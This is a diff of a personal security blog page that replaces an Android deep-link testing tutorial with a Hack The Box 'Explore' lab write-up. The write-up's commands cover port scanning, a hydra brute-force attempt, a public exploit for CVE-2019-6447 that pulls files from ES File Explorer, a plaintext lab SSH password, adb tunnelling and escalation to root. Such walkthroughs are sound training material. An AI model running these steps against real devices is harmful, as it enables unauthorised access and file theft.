@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 
-    <title>Exploiting Deep Links in Android - Part 5 (Testing)</title>
+    <title>HTB Write-up | Explore</title>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="HandheldFriendly" content="True" />
@@ -15,21 +15,28 @@
     <link rel="amphtml" href="amp/index.html" />
     
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="Exploiting Deep Links in Android - Part 5 (Testing)" />
-    <meta property="og:description" content="EnumerationEnumeration should always start with the App Manifest, which can be extracted from any .apk with a tool such as apktool, e.g.: ~ apktool d com.twitter.android_2021-10-22.apk  I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk I: Loading resource table... I: Decoding AndroidManifest.xml" />
-    <meta property="og:url" content="inesmartins.github.io/exploiting-deep-links-in-android-testing/" />
-    <meta property="og:image" content="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" />
-    <meta property="article:published_time" content="2021-10-30T17:20:05.000Z" />
-    <meta property="article:modified_time" content="2021-10-30T18:19:33.000Z" />
+    <meta property="og:title" content="HTB Write-up | Explore" />
+    <meta property="og:description" content="Retired machine can be found here.Let&#x27;s start with some basic scanning: ~ nmap -A 10.10.10.247 PORT     STATE    SERVICE    VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings:  |   NULL:  |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey:  |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:" />
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-explore/" />
+    <meta property="og:image" content="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" />
+    <meta property="article:published_time" content="2021-10-30T19:10:00.000Z" />
+    <meta property="article:modified_time" content="2021-10-30T19:10:00.000Z" />
+    <meta property="article:tag" content="android" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="ssh" />
+    <meta property="article:tag" content="adb" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Exploiting Deep Links in Android - Part 5 (Testing)" />
-    <meta name="twitter:description" content="EnumerationEnumeration should always start with the App Manifest, which can be extracted from any .apk with a tool such as apktool, e.g.: ~ apktool d com.twitter.android_2021-10-22.apk  I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk I: Loading resource table... I: Decoding AndroidManifest.xml" />
-    <meta name="twitter:url" content="inesmartins.github.io/exploiting-deep-links-in-android-testing/" />
-    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" />
+    <meta name="twitter:title" content="HTB Write-up | Explore" />
+    <meta name="twitter:description" content="Retired machine can be found here.Let&#x27;s start with some basic scanning: ~ nmap -A 10.10.10.247 PORT     STATE    SERVICE    VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings:  |   NULL:  |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey:  |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:" />
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-explore/" />
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
-    <meta property="og:image:width" content="1000" />
-    <meta property="og:image:height" content="563" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="android, htb, ssh, adb" />
+    <meta property="og:image:width" content="602" />
+    <meta property="og:image:height" content="375" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +65,18 @@
         "url": "inesmartins.github.io/author/ines/",
         "sameAs": []
     },
-    "headline": "Exploiting Deep Links in Android - Part 5 (Testing)",
-    "url": "inesmartins.github.io/exploiting-deep-links-in-android-testing/",
-    "datePublished": "2021-10-30T17:20:05.000Z",
-    "dateModified": "2021-10-30T18:19:33.000Z",
+    "headline": "HTB Write-up | Explore",
+    "url": "inesmartins.github.io/htb-write-up-explore/",
+    "datePublished": "2021-10-30T19:10:00.000Z",
+    "dateModified": "2021-10-30T19:10:00.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg",
-        "width": 1000,
-        "height": 563
+        "url": "inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png",
+        "width": 602,
+        "height": 375
     },
-    "description": "Enumeration\nEnumeration should always start with the App Manifest\n[https://www.google.com/search?q&#x3D;Android+Manifest&amp;rlz&#x3D;1C5CHFA_enPT957PT957&amp;oq&#x3D;Android+Manifest&amp;aqs&#x3D;chrome..69i57j69i60.222j0j7&amp;sourceid&#x3D;chrome&amp;ie&#x3D;UTF-8]\n, which can be extracted from any .apk with a tool such as apktool\n[https://ibotpeaches.github.io/Apktool/], e.g.:\n\n~ apktool d com.twitter.android_2021-10-22.apk \nI: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk\nI: Loading resource table...\nI: Decoding AndroidManifest",
+    "keywords": "android, htb, ssh, adb",
+    "description": "&gt; Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/356].\nLet&#x27;s start with some basic scanning:\n\n~ nmap -A 10.10.10.247\n\nPORT     STATE    SERVICE    VERSION\n2222/tcp open     ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-SSH Server - Banana Studio\n| ssh-hostkey: \n|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)\n5555/tcp filtered freeciv\n\nOn Android, the 5555 TCP port is usually open when the Android Debug Bridge\n[https://d",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "inesmartins.github.io/"
@@ -184,7 +192,7 @@
 </style><style>:root {--ghost-accent-color: #000000;}</style>
 
 </head>
-<body class="post-template">
+<body class="post-template tag-android tag-htb tag-ssh tag-adb">
 <div class="viewport">
 
     <header id="gh-head" class="gh-head has-cover">
@@ -220,12 +228,15 @@
 
 
 
-<article class="article post">
+<article class="article post tag-android tag-htb tag-ssh tag-adb">
 
     <header class="article-header gh-canvas">
 
+        <section class="article-tag">
+            <a href="../tag/android/index.html">android</a>
+        </section>
 
-        <h1 class="article-title">Exploiting Deep Links in Android - Part 5 (Testing)</h1>
+        <h1 class="article-title">HTB Write-up | Explore</h1>
 
 
         <div class="article-byline">
@@ -241,7 +252,7 @@
                     <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
                     <div class="byline-meta-content">
                         <time class="byline-meta-date" datetime="2021-10-30">Oct 30, 2021</time>
-                        <span class="byline-reading-time"><span class="bull">&bull;</span> 4 min read</span>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 3 min read</span>
                     </div>
                 </div>
             </section>
@@ -249,102 +260,97 @@
 
         <figure class="article-image">
             <img
-                srcset="../content/images/size/w300/2021/10/maxresdefault-1-1.jpeg 300w,
-                       ../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg 600w,
-                      ../content/images/size/w1000/2021/10/maxresdefault-1-1.jpeg 1000w,
-                     ../content/images/size/w2000/2021/10/maxresdefault-1-1.jpeg 2000w"
+                srcset="../content/images/size/w300/2021/08/Screenshot-2021-08-01-at-15.59.58.png 300w,
+                       ../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png 600w,
+                      ../content/images/size/w1000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 1000w,
+                     ../content/images/size/w2000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 2000w"
                 sizes="(min-width: 1400px) 1400px, 92vw"
-                src="../content/images/size/w2000/2021/10/maxresdefault-1-1.jpeg"
-                alt="Exploiting Deep Links in Android - Part 5 (Testing)"
+                src="../content/images/size/w2000/2021/08/Screenshot-2021-08-01-at-15.59.58.png"
+                alt="HTB Write-up | Explore"
             />
         </figure>
     </header>
 
     <section class="gh-content gh-canvas">
-        <h2 id="enumeration">Enumeration</h2><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
-I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
-I: Loading resource table...
-I: Decoding AndroidManifest.xml with resources...
-I: Loading resource table from file: /Users/inesmartins/Library/apktool/framework/1.apk
-I: Regular manifest package...
-I: Decoding file-resources...
-I: Decoding values */* XMLs...
-I: Baksmaling classes.dex...
-I: Baksmaling classes2.dex...
-I: Baksmaling classes3.dex...
-I: Baksmaling classes4.dex...
-I: Baksmaling classes5.dex...
-I: Baksmaling classes6.dex...
-I: Baksmaling classes7.dex...
-I: Baksmaling classes8.dex...
-I: Baksmaling classes9.dex...
-I: Copying assets and libs...
-I: Copying unknown files...
-I: Copying original files...
-I: Copying META-INF/services directory
+        <blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><p>Let's start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247
 
-~ open com.twitter.android_2021-10-22/AndroidManifest.xml</code></pre><p>When you open the manifest, you should start by looking for <code>&lt;intent-filter&gt;</code> elements:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/10/Screenshot-2021-10-30-at-18.24.30.png" class="kg-image" alt loading="lazy"></figure><p>Note the <strong>scheme</strong>, <strong>host</strong> and <strong>path</strong> attributes inside <code>&lt;data&gt;</code> elements to understand what deep links are supported, and check the <code>category</code> and <code>action</code> elements, as they give you clues about how the deep links are used.</p><p>The example below shows a Scheme URL with <code>scheme="myapp"</code> and <code>host="path"</code>, which means the following URI could be handled by the app: <code>myapp://path</code>.</p><pre><code>&lt;activity android:name=".MyUriActivity"&gt;
-  &lt;intent-filter&gt;
-      &lt;action android:name="android.intent.action.VIEW" /&gt;
-      &lt;category android:name="android.intent.category.DEFAULT" /&gt;
-      &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
-      &lt;data android:scheme="myapp" android:host="path" /&gt;
-  &lt;/intent-filter&gt;
-&lt;/activity&gt;</code></pre><p>When analysing app links, make sure the intent filter includes the  <code>android:autoVerify="true"</code> attribute, which enables app link verification:</p><pre><code>&lt;activity android:name=".MyUriActivity"&gt;
-  &lt;intent-filter android:autoVerify="true"&gt;
-      &lt;action android:name="android.intent.action.VIEW" /&gt;
-      &lt;category android:name="android.intent.category.DEFAULT" /&gt;
-      &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
-      &lt;data android:scheme="http" android:host="www.myapp.com" android:path="/my/app/path" /&gt;
-      &lt;data android:scheme="https" android:host="www.myapp.com" android:path="/my/app/path" /&gt;
-  &lt;/intent-filter&gt;
-&lt;/activity&gt;
-</code></pre><hr><h2 id="verifying-app-link-association">Verifying App Link Association</h2><p>The simplest way to check if a link is correctly verified is to just enter it onto a mobile browser and check that the link is automatically (without any user interaction) opened with the intended app.</p><p>If you're looking for additional information, you can also use <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester/blob/main/README.md">this</a> simple Python tool that I've developed. This library supports a bunch of different test modes and options, but most likely the <code>verify-applinks</code> option will give you what you need:</p><pre><code class="language-Python">~ python3 Android-App-Link-Verification-Tester/deeplink_analyser.py \
--apk com.twitter.android_2021-10-22.apk \
--p com.twitter.android \
--op verify-applinks
+PORT     STATE    SERVICE    VERSION
+2222/tcp open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered, which most likely means we'll only be able to access it from inside this machine.</p><p>Let's focus on the other port: the SSH Server application from "Banana Studio" is  <a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (<code>ssh</code> without any password):</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let's expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247
 
-[...]
+2222/tcp open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp filtered freeciv
+59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).</code></pre><p>Nice, another port!</p><p>Doing a bit of Googling we come across <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>:</p><blockquote>The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP.</blockquote><p>In order to exploit this misconfiguration, we can use <a href="https://www.exploit-db.com/exploits/50070">this</a> exploit.</p><p>After some trial and error, and with a bit of luck, I came across the user flag:</p><pre><code>~ python3 50070.py getFile 10.10.10.247 /sdcard/user.txt 
 
-The APK's signing certificate's SHA-256 fingerprint is: 
-0F:D9:A0:CF:B0:7B:65:95:09:97:B4:EA:EB:DC:53:93:13:92:39:1A:A4:06:53:8A:3B:04:07:3B:C2:CE:2F:E9
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
 
-[...]
+[+] Downloading file...
+[+] Done. Saved as `out.dat`.
 
-Checking http://mobile.twitter.com/.*
+~ htb_explore cat out.dat                                           
+f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let's continue enumerating using the available commands:</p><pre><code>~ python3 50070.py listPics 10.10.10.247
 
-✓ includes autoverify=true
-✓ includes VIEW action
-✓ includes BROWSABLE category
-✓ includes DEFAULT category
-✓ DAL verified
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
 
-  Relations: 
-    - [Standard] delegate_permission/common.get_login_creds
-    - [Standard] delegate_permission/common.handle_all_urls
-    - [Custom]   delegate_permission/common.use_as_origin
+...
+name : creds.jpg
+time : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size : 1.14 MB (1,200,401 Bytes)
+...</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png" class="kg-image" alt loading="lazy" width="908" height="300" srcset="../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.28.01.png 600w, ../content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png 908w" sizes="(min-width: 720px) 720px"></figure><p>And we got a winner!</p><pre><code>~ ssh kristi@10.10.10.247 -p 2222
+&gt; Kr1sT!5h@Rp3xPl0r3!
 
-Checking http://twitter.com/.*
+$ whoami
+u0_a76</code></pre><p>Now that we have access to some SSH credentials, let's forward the traffic from the machine's <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
 
-✓ includes autoverify=true
-✓ includes VIEW action
-✓ includes BROWSABLE category
-✓ includes DEFAULT category
-✓ DAL verified
+~ ssh -i ssh_key kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p 2222
+&gt; Kr1sT!5h@Rp3xPl0r3!
 
-  Relations: 
-    - [Standard] delegate_permission/common.get_login_creds
-    - [Standard] delegate_permission/common.handle_all_urls
-    - [Custom]   delegate_permission/common.use_as_origin
+$ whoami
+u0_a76</code></pre><p>Then, on another tab on the local machine we can connect to the local service:</p><pre><code>~ adb connect 127.0.0.1:5555
+connected to 127.0.0.1:5555
 
-[...]
+~ adb shell
 
-Read more about relation strings here: https://developers.google.com/digital-asset-links/v1/relation-strings</code></pre><hr><h2 id="static-and-dynamic-analysis">Static and Dynamic Analysis</h2><p>In order to understand what data is being taken from the deep links and how it’s being processed check for occurrences of <code>getIntent</code> and <code>getData</code>.</p><p>To understand how the app’s <code>WebViews</code> are controlling which URLs are loaded and how, look for <code>shouldOverrideUrlLoading</code> and <code>shouldInterceptRequest</code>.</p><p>Finally, to see how the <code>URLs</code> are being loaded into the app's <code>WebViews</code> check for any calls to <code>webview.loadUrl</code> or <code>webview.loadData</code>.</p><p>Note that, not only are these methods relevant when doing static analysis, you can also "hook" them with <a href="https://frida.re/docs/android/">Frida</a> when doing dynamic analysis.</p><hr><h2 id="automated-tests-and-fuzzing">Automated Tests and Fuzzing</h2><p>If you already know the deep link you you want to test, <a href="https://developer.android.com/studio/command-line/adb">adb</a> is the way to go:</p><pre><code>~ adb shell am start -W -a android.intent.action.VIEW -d &lt;url&gt;
+$ whoami
+shell</code></pre><p>Now let's see if we can authenticate as <code>root</code>:</p><pre><code>$ su - root
 
-where:
--a ~&gt; action
--W ~&gt; wait for launch to complete
--d ~&gt; URL</code></pre><p>If you want to build and send a specific Intent URL, you can create a new Android app using <a href="https://developer.android.com/studio?gclid=CjwKCAjw2vOLBhBPEiwAjEeK9up2NghnnyViWFBXSe8F-3DO0-kSFC9KH7g6q3xdkSb5GD0_g5q4nRoCiLEQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh4.googleusercontent.com/Yls7-O6Tjiy2gubg8v5SgKsTNiepUjuFaKAkvyn7CoHma9N7lpihmPKHnwrAhba7jvXyfqCx7o3mhMrTnOHOhqWAQ_UuV2ZEy8Nm-w9_Ix2gs1M2S9Ds8m1tQ1bTB9wop5yFqDOwIkk" class="kg-image" alt loading="lazy"></figure><p>Finally, if you have no idea what you're looking for, maybe give fuzzing a try with <a href="https://labs.f-secure.com/tools/drozer/">drozer</a>'s <a href="https://github.com/FSecureLABS/drozer-modules/blob/master/intents/fuzzinozer.py">fuzzinozzer</a> module:</p><pre><code>dz&gt; run intents.fuzzinozer --complete_test --package com.twitter.android --save_state</code></pre><hr><p>And this is it, the end of the road for this series.<br>Hope you learned something!</p>
+$ whoami
+root
+
+$ cd data      
+
+$ ls
+adb           bootchart     media       property       tombstones 
+anr           cache         mediadrm    resource-cache user       
+app           dalvik-cache  misc        root.txt       user_de    
+app-asec      data          misc_ce     ss             vendor     
+app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
+app-lib       es_starter.sh nfc         system         vendor_de  
+app-private   local         ota         system_ce      
+backup        lost+found    ota_package system_de      
+
+$ cat root.txt
+f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="https://github.com/alecgorge/jsonapi">https://github.com/alecgorge/jsonapi</a></li><li><a href="https://www.pluginvulnerabilities.com/2019/08/07/open-redirect-vulnerability-in-json-api/">https://www.pluginvulnerabilities.com/2019/08/07/open-redirect-vulnerability-in-json-api/</a></li></ul>
     </section>
 
 
@@ -368,27 +374,27 @@ where:
                     
 <article class="post-card post ">
 
-    <a class="post-card-image-link" href="../htb-write-up-explore/index.html">
+    <a class="post-card-image-link" href="../exploiting-deep-links-in-android-testing/index.html">
         <img class="post-card-image"
-            srcset="../content/images/size/w300/2021/08/Screenshot-2021-08-01-at-15.59.58.png 300w,
-                   ../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png 600w,
-                  ../content/images/size/w1000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 1000w,
-                 ../content/images/size/w2000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 2000w"
+            srcset="../content/images/size/w300/2021/10/maxresdefault-1-1.jpeg 300w,
+                   ../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg 600w,
+                  ../content/images/size/w1000/2021/10/maxresdefault-1-1.jpeg 1000w,
+                 ../content/images/size/w2000/2021/10/maxresdefault-1-1.jpeg 2000w"
             sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png"
-            alt="HTB Write-up | Explore"
+            src="../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg"
+            alt="Exploiting Deep Links in Android - Part 5 (Testing)"
             loading="lazy"
         />
     </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="../htb-write-up-explore/index.html">
+        <a class="post-card-content-link" href="../exploiting-deep-links-in-android-testing/index.html">
             <header class="post-card-header">
-                <h2 class="post-card-title">HTB Write-up | Explore</h2>
+                <h2 class="post-card-title">Exploiting Deep Links in Android - Part 5 (Testing)</h2>
             </header>
             <section class="post-card-excerpt">
-                <p>Retired machine can be found here.Let's start with some basic scanning: ~ nmap -A 10.10.10.247 PORT     STATE    SERVICE    VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings:  |   NULL:  |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey:  |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:</p>
+                <p>EnumerationEnumeration should always start with the App Manifest, which can be extracted from any .apk with a tool such as apktool, e.g.: ~ apktool d com.twitter.android_2021-10-22.apk  I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk I: Loading resource table... I: Decoding AndroidManifest.xml</p>
             </section>
         </a>
 
@@ -402,7 +408,7 @@ where:
             </ul>
             <div class="post-card-byline-content">
                 <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 3 min read</span>
+                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 4 min read</span>
             </div>
         </footer>
 
